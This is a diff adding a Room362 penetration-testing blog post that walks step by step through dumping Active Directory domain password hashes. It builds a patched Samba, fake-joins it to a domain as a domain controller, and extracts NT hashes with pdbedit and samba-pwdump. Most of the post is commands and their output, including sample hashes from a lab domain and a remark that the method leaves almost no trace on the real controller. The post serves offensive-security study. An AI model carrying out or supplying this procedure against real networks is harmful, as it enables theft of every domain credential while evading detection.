@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.15" />
+
+  <title>Dumping NTDS.dit domain hashes using Samba &middot; Room362</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Room362" href="http://room362.com/index.xml" />
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="http://room362.com/img/favicon.ico" type="image/x-icon" />
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/brandon/"><i class='fa fa-users fa-fw'></i>Brandon</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://room362.com/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/mubix" target="_blank"><i class="fa fa-twitter fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/mubix" target="_blank"><i class="fa fa-facebook fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://plus.google.com/+mubix" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://instagram.com/mubix" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://flickr.com/photos/mubix" target="_blank"><i class="fa fa-flickr fa-fw"></i>Flickr</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://youtube.com/user/hak5" target="_blank"><i class="fa fa-youtube fa-fw"></i>YouTube</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://vimeo.com/mubix" target="_blank"><i class="fa fa-vimeo fa-fw"></i>Vimeo</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://slideshare.net/mubix" target="_blank"><i class="fa fa-slideshare fa-fw"></i>SlideShare</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/mubix" target="_blank"><i class="fa fa-linkedin fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://reddit.com/user/mubix" target="_blank"><i class="fa fa-reddit fa-fw"></i>Reddit</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/mubix" target="_blank"><i class="fa fa-github-alt fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https:////bitbucket.org/mubix" target="_blank"><i class="fa fa-bitbucket fa-fw"></i>Bitbucket</a>
+    </li>
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Dumping NTDS.dit domain hashes using Samba</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p>So there was this blog post that talking about a number of ways to dump windows credentials by <a href="https://twitter.com/lanjelot">@lanjelot</a> [definitly someone to follow] - here: <a href="https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/">https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/</a> and at the very bottom of this post it says &ldquo;<strong>AD Replication (EXPERIMENTAL)</strong>&ldquo;</p>
+
+<p>What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it <strong><em>doesn&rsquo;t require code execution in any way on the domain controller</em></strong>.</p>
+
+<p>Notice: I am not doing this on a Kali Linux box, there is already an install of Samba there and I didn&rsquo;t want to try uninstalling or modifying the one installed.</p>
+
+<p>First, you need this patch:</p>
+
+<p><code>wget http://files.securusglobal.com/samba-4.1.0_replication-only-patch.txt</code></p>
+
+<p>and Samba 4.1.0</p>
+
+<p><code>wget http://ftp.samba.org/pub/samba/stable/samba-4.1.0.tar.gz</code></p>
+
+<p>You will probably also require some dependencies to be installed:</p>
+
+<p><code>apt-get install python2.7-dev python-samba libacl1-dev build-essential libldap2-dev libkrb5-dev attr</code></p>
+
+<p>Since the patch is kinda wonky, you need to make a <code>src</code> directory and extract samba into there first. Then apply the patch in whatever directory is above src</p>
+
+<pre><code>mkdir src
+mv samba-4.1.0.tar.gz src/
+cd src/
+tar zxvf samba-4.1.0.tar.gz
+cd /root/
+</code></pre>
+
+<p>So it would look like this:</p>
+
+<pre><code>samba-4.1.0_replication-only-patch.txt
+src/
+src/samba-4.1.0/
+</code></pre>
+
+<p>then run <code>patch -p0 &lt; samba-4.1.0_replication-only-patch.txt</code></p>
+
+<pre><code>cd ./src/samba-4.1.0/
+./configure
+make
+make install
+</code></pre>
+
+<p>Prepare the box:</p>
+
+<pre><code>rm -rf /var/lib/samba; mkdir /var/lib/samba; rm -f /etc/samba/smb.conf
+</code></pre>
+
+<p>Next you need to make sure you are resolving correctly (if you can&rsquo;t resolve the SRV record <code>_ldap._tcp.sittingduck.info</code> (sittingduck.info being the domain) then this isn&rsquo;t going to work.</p>
+
+<pre><code>echo nameserver 192.168.92.37 &gt; /etc/resolv.conf # this is the IP address of the DC
+</code></pre>
+
+<p>Then start the clone:</p>
+
+<pre><code>/usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
+</code></pre>
+
+<p>Looks like this:</p>
+
+<pre><code>root@sambabox:~/src/samba-4.1.0# /usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
+Finding a writeable DC for domain 'sittingduck.info'
+Found DC 2K8DC.sittingduck.info
+Password for [SITTINGDUCK\administrator]:
+workgroup is SITTINGDUCK
+realm is sittingduck.info
+Calling bare provision
+No IPv6 address will be assigned
+Provision OK for domain DN DC=sittingduck,DC=info
+Starting replication
+Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[402] linked_values[0]
+Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[804] linked_values[0]
+Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[1206] linked_values[0]
+Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[1521] linked_values[0]
+Analyze and apply schema objects
+Partition[CN=Configuration,DC=sittingduck,DC=info] objects[402] linked_values[0]
+Partition[CN=Configuration,DC=sittingduck,DC=info] objects[804] linked_values[0]
+Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1206] linked_values[0]
+Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1608] linked_values[1]
+Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1614] linked_values[11]
+Replicating critical objects from the base DN of the domain
+Partition[DC=sittingduck,DC=info] objects[100] linked_values[24]
+Partition[DC=sittingduck,DC=info] objects[353] linked_values[27]
+Done with always replicated NC (base, config, schema)
+Committing SAM database
+descriptor_sd_propagation_recursive: DC=DomainDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info
+descriptor_sd_propagation_recursive: DC=ForestDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info
+Joined domain SITTINGDUCK (SID S-1-5-21-3147519476-3247671789-820278723) as a DC
+
+</code></pre>
+
+<p>Then to get the hashes:</p>
+
+<pre><code>root@sambabox:~# /usr/local/samba/bin/pdbedit -L -w
+2K8DC$:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:CB14F1166BBE1749AC0FB40240C5DC30:[S          ]:LCT-530FC425:
+Administrator:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[U          ]:LCT-531006A4:
+krbtgt:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:F2EE6AB6F40810169E0E46B126CEFBEF:[DU         ]:LCT-530FC3FF:
+nobody:65534:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:[U          ]:LCT-00000000:
+jdoe:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[UX         ]:LCT-530FC5FF:
+uber:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[UX         ]:LCT-53101261:
+
+</code></pre>
+
+<p>Or you can do it with history:</p>
+
+<pre><code>root@sambabox:~# python samba-pwdump.py /usr/local/samba/private/sam.ldb.d/DC\=SITTINGDUCK\,DC\=INFO.ldb -history
+SAMBACLONE$:1104:::::
+2K8DC$:1000::cb14f1166bbe1749ac0fb40240c5dc30:::
+Administrator:500::88e4d9fabaecf3dec18dd80905521b29:::
+krbtgt:502::f2ee6ab6f40810169e0e46b126cefbef:::
+Guest:501:::::
+jdoe:1103::88e4d9fabaecf3dec18dd80905521b29:::
+uber:1105::88e4d9fabaecf3dec18dd80905521b29:::
+uber_history0:1105:444d1edcad01ae08f49f073e12e8cc14:88e4d9fabaecf3dec18dd80905521b29:::
+</code></pre>
+
+<p>Game over. The great thing is that it never actually shows up as a joined box in the domain, and as far as I can tell the only log on the real DC is the login success of a domain admin. Plus one of the huge benefits to this method is that once you have the database Samba makes it really easy to query information like group membership or users info after the fact, not just hashes.</p>
+
+</div>
+
+</div>
+</div>
+<script src="http://room362.com/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
